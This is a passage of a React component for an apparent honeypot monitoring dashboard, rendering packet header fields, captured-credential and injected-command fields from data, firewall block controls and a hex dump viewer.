                    <div className="mt-2 pl-5 space-y-1 text-[11px] text-slate-400 border-l border-white/10 ml-2">
                      <p>Version: 4 | Header Length: 20 bytes</p>
                      <p>Total Length: {selectedPacket.length - 14} bytes | Time to Live (TTL): {selectedPacket.dissectorData.ip.ttl}</p>
                      <p>Protocol: TCP (6) | Header Checksum: {selectedPacket.dissectorData.ip.checksum}</p>
                      <p>Source Address: <b className="text-white">{selectedPacket.sourceIp}</b></p>
                      <p>Destination Address: <b className="text-[#14f7ff]">{selectedPacket.destIp}</b></p>
                    </div>
                  )}
                </div>

                {/* 4. Transmission Control Protocol (TCP) */}
                <div className="bg-[#030712] border border-white/5 rounded-lg p-2">
                  <button
                    onClick={() => toggleSection("tcp")}
                    className="w-full flex items-center justify-between text-left font-bold text-slate-300 hover:text-white cursor-pointer"
                  >
                    <span className="flex items-center gap-1.5">
                      {expandedSections.tcp ? <ChevronDown className="w-3.5 h-3.5" /> : <ChevronRight className="w-3.5 h-3.5" />}
                      Transmission Control Protocol, Src Port: {selectedPacket.sourcePort}, Dst Port: {selectedPacket.destPort}, Flags: {selectedPacket.tcpFlags.join(", ")}
                    </span>
                  </button>
                  {expandedSections.tcp && (
                    <div className="mt-2 pl-5 space-y-1 text-[11px] text-slate-400 border-l border-white/10 ml-2">
                      <p>Source Port: {selectedPacket.sourcePort} | Destination Port: {selectedPacket.destPort}</p>
                      <p>Sequence Number: {selectedPacket.seqNumber} | Acknowledgment Number: {selectedPacket.ackNumber}</p>
                      <p>Flags: {selectedPacket.dissectorData.tcp.flagsHex}</p>
                      <p>Window Size: {selectedPacket.windowSize} | Options: {selectedPacket.dissectorData.tcp.options}</p>
                    </div>
                  )}
                </div>

                {/* 5. Honeypot Subsystem Application Layer */}
                <div className="bg-[#091024] border border-[#14f7ff]/30 rounded-lg p-2.5">
                  <button
                    onClick={() => toggleSection("app")}
                    className="w-full flex items-center justify-between text-left font-bold text-[#14f7ff] hover:text-white cursor-pointer"
                  >
                    <span className="flex items-center gap-1.5">
                      {expandedSections.app ? <ChevronDown className="w-3.5 h-3.5" /> : <ChevronRight className="w-3.5 h-3.5" />}
                      [Aegis Honeypot Dissector: {selectedPacket.honeypotService} Decoy Intercept Engine]
                    </span>
                  </button>
                  {expandedSections.app && (
                    <div className="mt-2 pl-5 space-y-1.5 text-[11px] text-slate-300 border-l border-[#14f7ff]/40 ml-2">
                      <p>
                        <b className="text-white">Active Honeytrap: </b>
                        {selectedPacket.dissectorData.honeypotMetadata.trapName}
                      </p>
                      {selectedPacket.dissectorData.honeypotMetadata.credentialsCaptured && (
                        <p className="bg-red-950/40 p-1.5 rounded border border-red-800/40 text-red-200">
                          <b className="text-red-400">🚨 Harvested Credentials: </b>
                          Username: '{selectedPacket.dissectorData.honeypotMetadata.credentialsCaptured.username}' | Password: '{selectedPacket.dissectorData.honeypotMetadata.credentialsCaptured.password}'
                        </p>
                      )}
                      {selectedPacket.dissectorData.honeypotMetadata.commandInjected && (
                        <p className="bg-amber-950/40 p-1.5 rounded border border-amber-800/40 text-amber-200">
                          <b className="text-amber-400">⚠️ Shell Command Injected: </b>
                          <code>{selectedPacket.dissectorData.honeypotMetadata.commandInjected}</code>
                        </p>
                      )}
                      <p>
                        <b className="text-white">MITRE ATT&CK: </b>
                        {selectedPacket.dissectorData.honeypotMetadata.mitreAttackTactic}
                      </p>
                      <p>
                        <b className="text-white">Firewall Enforcement: </b>
                        <span className={`font-bold ${
                          selectedPacket.dissectorData.honeypotMetadata.firewallAction === "BLOCKED_IPTABLES"
                            ? "text-red-400"
                            : "text-emerald-400"
                        }`}>
                          {selectedPacket.dissectorData.honeypotMetadata.firewallAction === "BLOCKED_IPTABLES"
                            ? `🔥 iptables DROP rule deployed against ${selectedPacket.sourceIp}`
                            : "Decoy Response Generated (Session contained in honeynet)"}
                        </span>
                      </p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Quick Ban Action footer inside tree */}
            {selectedPacket.dissectorData.honeypotMetadata.firewallAction !== "BLOCKED_IPTABLES" && onFirewallBlock && (
              <div className="mt-3 pt-3 border-t border-white/5 flex justify-between items-center text-xs">
                <span className="text-slate-400">Host IP: {selectedPacket.sourceIp}</span>
                <button
                  onClick={() => onFirewallBlock(selectedPacket.sourceIp, `Wireshark Packet Inspection: Probe on port :${selectedPacket.destPort}`)}
                  className="bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/40 px-3 py-1 rounded font-bold transition-all cursor-pointer flex items-center gap-1.5"
                >
                  <Flame className="w-3.5 h-3.5" />
                  Enforce Immediate Firewall Drop
                </button>
              </div>
            )}
          </div>

          {/* BOTTOM PANE: HEX DUMP & ASCII INSPECTOR (5 cols) */}
          <div className="lg:col-span-5 bg-[#060a13] border border-blue-500/25 rounded-xl p-4 shadow-xl flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between border-b border-white/10 pb-2 mb-3">
                <div className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[#14f7ff]" />
                  <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                    Packet Bytes / Hex Dump ({selectedPacket.length} Bytes)
                  </h4>
                </div>
                <span className="text-[10px] text-slate-500 font-mono">16-Byte Aligned</span>
              </div>

              {/* Hex Dump Table view */}
              <div className="bg-[#020617] border border-white/5 rounded-lg p-3 overflow-x-auto max-h-80 overflow-y-auto custom-scrollbar font-mono text-[10px] leading-relaxed">
                {hexLines.map((line, idx) => (
                  <div key={idx} className="flex gap-3 hover:bg-white/[0.03] px-1 rounded transition-colors">
                    <span className="text-slate-500 select-none w-10 shrink-0">{line.offset}</span>
                    <span className="text-cyan-300 w-28 shrink-0">{line.hexLeft}</span>
                    <span className="text-cyan-300 w-28 shrink-0">{line.hexRight}</span>
                    <span className="text-emerald-400 border-l border-white/10 pl-2 shrink-0">{line.ascii}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Decoded Application Text Preview */}
            {selectedPacket.payloadUtf8 && (
              <div className="mt-3 pt-2 border-t border-white/5">
                <span className="text-[10px] text-slate-400 block mb-1 uppercase font-bold">
                  Decoded ASCII Payload:
                </span>
                <pre className="bg-[#030712] border border-white/5 p-2 rounded text-[10px] text-slate-200 overflow-x-auto whitespace-pre-wrap max-h-20">
                  {selectedPacket.payloadUtf8}
                </pre>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
